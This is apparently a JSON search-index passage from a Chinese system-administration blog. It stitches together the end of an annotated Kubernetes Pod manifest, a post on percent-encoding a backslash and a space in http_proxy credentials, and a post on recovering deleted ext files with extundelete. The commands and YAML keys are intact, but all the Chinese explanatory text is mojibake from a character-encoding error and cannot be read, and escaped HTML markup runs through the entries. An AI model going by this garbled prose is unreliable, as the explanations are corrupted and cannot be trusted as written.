class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003etcpSocket\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e     \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¯¹Podå†…ä¸ªå®¹å™¨å¥åº·æ£€æŸ¥æ–¹å¼è®¾ç½®ä¸ºtcpSocketæ–¹å¼\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e         \u003c/span\u003e\u003cspan class=\"nt\"\u003eport\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003enumber\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003einitialDelaySeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"c\"\u003e#å®¹å™¨å¯åŠ¨å®Œæˆåé¦–æ¬¡æ¢æµ‹çš„æ—¶é—´ï¼Œå•ä½ä¸ºç§’\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003etimeoutSeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003cspan class=\"w\"\u003e    ã€€ã€€    \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¯¹å®¹å™¨å¥åº·æ£€æŸ¥æ¢æµ‹ç­‰å¾…å“åº”çš„è¶…æ—¶æ—¶é—´ï¼Œå•ä½ç§’ï¼Œé»˜è®¤1ç§’\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003eperiodSeconds\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003cspan class=\"w\"\u003e     ã€€ã€€    \u003c/span\u003e\u003cspan class=\"c\"\u003e#å¯¹å®¹å™¨ç›‘æ§æ£€æŸ¥çš„å®šæœŸæ¢æµ‹æ—¶é—´è®¾ç½®ï¼Œå•ä½ç§’ï¼Œé»˜è®¤10ç§’ä¸€æ¬¡\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003esuccessThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003efailureThreshold\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"m\"\u003e0\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"nt\"\u003esecurityContext\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e         \u003c/span\u003e\u003cspan class=\"nt\"\u003eprivileged\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003erestartPolicy\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"l\"\u003eAlways | Never | OnFailure] \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#Podçš„é‡å¯ç­–ç•¥\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003enodeName\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003e\u0026lt;string\u0026gt;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#è®¾ç½®NodeNameè¡¨ç¤ºå°†è¯¥Podè°ƒåº¦åˆ°æŒ‡å®šåˆ°åç§°çš„nodeèŠ‚ç‚¹ä¸Š\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003enodeSelector\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003eobeject\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#è®¾ç½®NodeSelectorè¡¨ç¤ºå°†è¯¥Podè°ƒåº¦åˆ°åŒ…å«è¿™ä¸ªlabelçš„nodeä¸Š\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003eimagePullSecrets\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#Pullé•œåƒæ—¶ä½¿ç”¨çš„secretåç§°ï¼Œä»¥keyï¼šsecretkeyæ ¼å¼æŒ‡å®š\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003ehostNetwork\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"kc\"\u003efalse\u003c/span\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"c\"\u003e#æ˜¯å¦ä½¿ç”¨ä¸»æœºç½‘ç»œæ¨¡å¼ï¼Œé»˜è®¤ä¸ºfalseï¼Œå¦‚æœè®¾ç½®ä¸ºtrueï¼Œè¡¨ç¤ºä½¿ç”¨å®¿ä¸»æœºç½‘ç»œ\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e\u003cspan class=\"nt\"\u003evolumes\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e   \u003c/span\u003e\u003cspan class=\"c\"\u003e#åœ¨è¯¥podä¸Šå®šä¹‰å…±äº«å­˜å‚¨å·åˆ—è¡¨\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e  \u003c/span\u003e- \u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring   \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#å…±äº«å­˜å‚¨å·åç§° ï¼ˆvolumesç±»å‹æœ‰å¾ˆå¤šç§ï¼‰\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003eemptyDir\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e{}\u003cspan class=\"w\"\u003e       \u003c/span\u003e\u003cspan class=\"c\"\u003e#ç±»å‹ä¸ºemtyDirçš„å­˜å‚¨å·ï¼Œä¸PodåŒç”Ÿå‘½å‘¨æœŸçš„ä¸€ä¸ªä¸´æ—¶ç›®å½•ã€‚ä¸ºç©ºå€¼\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003ehostPath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring  \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#ç±»å‹ä¸ºhostPathçš„å­˜å‚¨å·ï¼Œè¡¨ç¤ºæŒ‚è½½Podæ‰€åœ¨å®¿ä¸»æœºçš„ç›®å½•\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring      ã€€ã€€       \u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"c\"\u003e#Podæ‰€åœ¨å®¿ä¸»æœºçš„ç›®å½•ï¼Œå°†è¢«ç”¨äºåŒæœŸä¸­mountçš„ç›®å½•\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003esecret\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e       ã€€ã€€ã€€\u003c/span\u003e\u003cspan class=\"c\"\u003e#ç±»å‹ä¸ºsecretçš„å­˜å‚¨å·ï¼ŒæŒ‚è½½é›†ç¾¤ä¸å®šä¹‰çš„secretå¯¹è±¡åˆ°å®¹å™¨å†…éƒ¨\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003escretname\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring  \u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e     \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e- \u003cspan class=\"nt\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e    \u003c/span\u003e\u003cspan class=\"nt\"\u003econfigMap\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e         \u003c/span\u003e\u003cspan class=\"c\"\u003e#ç±»å‹ä¸ºconfigMapçš„å­˜å‚¨å·ï¼ŒæŒ‚è½½é¢„å®šä¹‰çš„configMapå¯¹è±¡åˆ°å®¹å™¨å†…éƒ¨\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003ename\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e\u003cspan class=\"nt\"\u003eitems\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e      \u003c/span\u003e- \u003cspan class=\"nt\"\u003ekey\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"w\"\u003e        \u003c/span\u003e\u003cspan class=\"nt\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"l\"\u003estring\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eåœ¨kubernetesä¸­åŸºæœ¬æ‰€æœ‰èµ„æºçš„ä¸€çº§å±æ€§éƒ½æ˜¯ä¸€æ ·çš„ï¼Œä¸»è¦åŒ…å«5éƒ¨åˆ†ï¼š\u003c/p\u003e","title":"kubernetesä¸­Podèµ„æºæ¸…å•å’Œè§£é‡Š"},{"content":"é‡åˆ°ä¸ªæ€ªé—®é¢˜ï¼Œè®¾ç½®http_proxyçš„æ—¶å€™æœ‰ç”¨æˆ·å¯†ç ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š\nexport http_proxy=http://user\\2016:PmnQ 2016@192.168.0.1:3128 ç»“æœä¸ç”Ÿæ•ˆï¼Œä»”ç»†è§‚å¯Ÿä¸Šé¢çš„å‘½ä»¤ï¼š\nç”¨æˆ·åå…¶å®æ˜¯ï¼š\u0026ldquo;user\\2016\u0026rdquo;ï¼Œé‡Œé¢æœ‰ä¸ªåæ–œæ \\\nè€Œå¯†ç æ˜¯ï¼š\u0026ldquo;PmnQ 2016\u0026rdquo;ï¼Œé‡Œé¢æœ‰ä¸ªç©ºæ ¼\nè¿™ä¸‹éº»çƒ¦äº†ï¼Œå‘½ä»¤è¿‡ä¸å»å•Šã€‚\nåå¤æœç´¢æ‰¾åˆ°äº†å­—ç¬¦è½¬ä¹‰è¡¨ï¼Œç¬¬ä¸€ä¸ªå›¾æ˜¯å¯ä»¥å®‰å…¨è½¬ä¹‰çš„ï¼š\nä¸‹é¢è¿™å¼ æ˜¯ä¸å®‰å…¨çš„ï¼š\nè½¬ä¸€ä¸‹å§ï¼š \\ çš„16è¿›åˆ¶HEXæ˜¯%5Cï¼Œç©ºæ ¼çš„16è¿›åˆ¶HEXæ˜¯%20\næœ€åçš„è¯­æ³•ï¼š\nexport http_proxy=http://user%5C2016:PmnQ%202016@192.168.0.1:3128 æå®šæ”¶å·¥ã€‚\n","permalink":"https://rendoumi.com/posts/20240119-url_encode/","summary":"\u003cp\u003eé‡åˆ°ä¸ªæ€ªé—®é¢˜ï¼Œè®¾ç½®http_proxyçš„æ—¶å€™æœ‰ç”¨æˆ·å¯†ç ï¼Œå‘½ä»¤å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ehttp_proxy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://user\u003cspan class=\"se\"\u003e\\2\u003c/span\u003e016:PmnQ 2016@192.168.0.1:3128  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç»“æœä¸ç”Ÿæ•ˆï¼Œä»”ç»†è§‚å¯Ÿä¸Šé¢çš„å‘½ä»¤ï¼š\u003c/p\u003e\n\u003cp\u003eç”¨æˆ·åå…¶å®æ˜¯ï¼š\u0026ldquo;user\\2016\u0026rdquo;ï¼Œé‡Œé¢æœ‰ä¸ªåæ–œæ \\\u003c/p\u003e\n\u003cp\u003eè€Œå¯†ç æ˜¯ï¼š\u0026ldquo;PmnQ 2016\u0026rdquo;ï¼Œé‡Œé¢æœ‰ä¸ªç©ºæ ¼\u003c/p\u003e\n\u003cp\u003eè¿™ä¸‹éº»çƒ¦äº†ï¼Œå‘½ä»¤è¿‡ä¸å»å•Šã€‚\u003c/p\u003e\n\u003cp\u003eåå¤æœç´¢æ‰¾åˆ°äº†å­—ç¬¦è½¬ä¹‰è¡¨ï¼Œç¬¬ä¸€ä¸ªå›¾æ˜¯å¯ä»¥å®‰å…¨è½¬ä¹‰çš„ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240119131946433\" loading=\"lazy\" src=\"/posts/20240119-url_encode/image-20240119131946433.png\"\u003e\u003c/p\u003e\n\u003cp\u003eä¸‹é¢è¿™å¼ æ˜¯ä¸å®‰å…¨çš„ï¼š\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20240119132010631\" loading=\"lazy\" src=\"/posts/20240119-url_encode/image-20240119132010631.png\"\u003e\u003c/p\u003e\n\u003cp\u003eè½¬ä¸€ä¸‹å§ï¼š \\ çš„16è¿›åˆ¶HEXæ˜¯%5Cï¼Œç©ºæ ¼çš„16è¿›åˆ¶HEXæ˜¯%20\u003c/p\u003e\n\u003cp\u003eæœ€åçš„è¯­æ³•ï¼š\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003eexport\u003c/span\u003e \u003cspan class=\"nv\"\u003ehttp_proxy\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ehttp://user%5C2016:PmnQ%202016@192.168.0.1:3128  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæå®šæ”¶å·¥ã€‚\u003c/p\u003e","title":"urlä¸­çš„å­—ç¬¦è½¬ä¹‰"},{"content":"è€ƒå¤ç¯‡ï¼Œè®°å½•ä¸‹æ¥ï¼Œç°åœ¨éƒ½æ˜¯xfsäº†ï¼Œä½†æ˜¯æ–¹æ³•ä¸èƒ½å¿˜å•Šï¼\næ¢å¤è¿‡ç¨‹å¦‚ä¸‹ï¼š\n1ã€å®‰è£…extundelete yum -y install e2fsprogs e2fsprogs-libs e2fsprogs-devel wget http://jaist.dl.sourceforge.net/project/extundelete/extundelete/0.2.4/extundelete-0.2.4.tar.bz2 tar -jxvf extundelete-0.2.4.tar.bz2 cd extundelete-0.2.4 ./configure make make install 2ã€å¸è½½è¦æ¢å¤çš„åˆ†åŒº å¦‚æœä½ è¯¯åˆ é™¤çš„åˆ†åŒºæ˜¯/dev/sda2,é‚£ä¹ˆé¦–å…ˆéœ€è¦umount è¿™ä¸ªåˆ†åŒºçš„æŒ‚è½½ç‚¹\n3ã€å¼€å§‹æ¢å¤ é¦–å…ˆdf -lhæŸ¥çœ‹åˆ†åŒºçš„ä½¿ç”¨æƒ…å†µï¼Œé€‰æ‹©ä¸€ä¸ªå‰©ä½™ç©ºé—´è¶³å¤Ÿå®¹çº³è¦æ¢å¤çš„æ–‡ä»¶å¤§å°çš„åˆ†åŒºï¼Œä¾‹å¦‚ä½ çš„/homeåˆ†åŒºå‰©ä½™100Gï¼Œä½ éœ€è¦æ¢å¤çš„æ–‡ä»¶å°äº100Gï¼Œé‚£ä¹ˆä½ å¯ä»¥cd /home ç„¶åè¿›è¡Œæ¢å¤æ“ä½œ\ncd /home æ¢å¤å•ä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹\nextundelete /dev/mapper/vg_localhost-lv_home â€“restore-files æ–‡ä»¶å æˆ‘æ˜¯ç›´æ¥æ¢å¤æ•´ä¸ªåˆ†åŒº\nextundelete /dev/mapper/vg_localhost-lv_home â€“restore-all ç„¶åä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ªæ¢å¤æ–‡ä»¶å¤¹ï¼Œè¿›å»æ‰¾ä½ è¦çš„æ–‡ä»¶å°±å¯ä»¥äº†\n","permalink":"https://rendoumi.com/posts/20240119-extundelete/","summary":"\u003cp\u003eè€ƒå¤ç¯‡ï¼Œè®°å½•ä¸‹æ¥ï¼Œç°åœ¨éƒ½æ˜¯xfsäº†ï¼Œä½†æ˜¯æ–¹æ³•ä¸èƒ½å¿˜å•Šï¼\u003c/p\u003e\n\u003cp\u003eæ¢å¤è¿‡ç¨‹å¦‚ä¸‹ï¼š\u003c/p\u003e\n\u003ch6 id=\"1å®‰è£…extundelete\"\u003e1ã€å®‰è£…extundelete\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eyum -y install e2fsprogs e2fsprogs-libs e2fsprogs-devel  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewget http://jaist.dl.sourceforge.net/project/extundelete/extundelete/0.2.4/extundelete-0.2.4.tar.bz2  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar -jxvf extundelete-0.2.4.tar.bz2  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e extundelete-0.2.4  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e./configure\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake install  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"2å¸è½½è¦æ¢å¤çš„åˆ†åŒº\"\u003e2ã€å¸è½½è¦æ¢å¤çš„åˆ†åŒº\u003c/h6\u003e\n\u003cp\u003eå¦‚æœä½ è¯¯åˆ é™¤çš„åˆ†åŒºæ˜¯/dev/sda2,é‚£ä¹ˆé¦–å…ˆéœ€è¦umount è¿™ä¸ªåˆ†åŒºçš„æŒ‚è½½ç‚¹\u003c/p\u003e\n\u003ch6 id=\"3å¼€å§‹æ¢å¤\"\u003e3ã€å¼€å§‹æ¢å¤\u003c/h6\u003e\n\u003cp\u003eé¦–å…ˆdf -lhæŸ¥çœ‹åˆ†åŒºçš„ä½¿ç”¨æƒ…å†µï¼Œé€‰æ‹©ä¸€ä¸ªå‰©ä½™ç©ºé—´è¶³å¤Ÿå®¹çº³è¦æ¢å¤çš„æ–‡ä»¶å¤§å°çš„åˆ†åŒºï¼Œä¾‹å¦‚ä½ çš„/homeåˆ†åŒºå‰©ä½™100Gï¼Œä½ éœ€è¦æ¢å¤çš„æ–‡ä»¶å°äº100Gï¼Œé‚£ä¹ˆä½ å¯ä»¥cd /home ç„¶åè¿›è¡Œæ¢å¤æ“ä½œ\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e /home  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæ¢å¤å•ä¸ªæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eextundelete /dev/mapper/vg_localhost-lv_home â€“restore-files æ–‡ä»¶å  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eæˆ‘æ˜¯ç›´æ¥æ¢å¤æ•´ä¸ªåˆ†åŒº\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eextundelete /dev/mapper/vg_localhost-lv_home â€“restore-all  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003eç„¶åä¼šåœ¨å½“å‰ç›®å½•ç”Ÿæˆä¸€ä¸ªæ¢å¤æ–‡ä»¶å¤¹ï¼Œè¿›å»æ‰¾ä½ è¦çš„æ–‡ä»¶å°±å¯ä»¥äº†\u003c/p\u003e","title":"å¦‚ä½•é€šè¿‡extundeleteæ¢å¤åˆ 